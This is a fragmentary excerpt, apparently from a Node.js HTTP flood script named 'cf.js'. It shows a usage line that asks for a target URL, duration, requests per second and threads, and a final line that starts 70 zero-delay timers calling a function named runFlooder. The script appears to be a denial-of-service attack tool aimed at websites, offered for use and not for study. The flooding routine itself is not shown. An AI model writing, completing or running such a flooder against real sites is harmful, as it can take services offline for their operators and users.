 ...
 if (process.argv.length < 5){console.log(`Usage: node cf.js URL TIME REQ_PER_SEC THREADS\nExample: node cf.js ${target} ${time} 50 30`); process.exit();}
...
} else {for (let i = 0; i < 70; i++) { setInterval(runFlooder, 0) }}
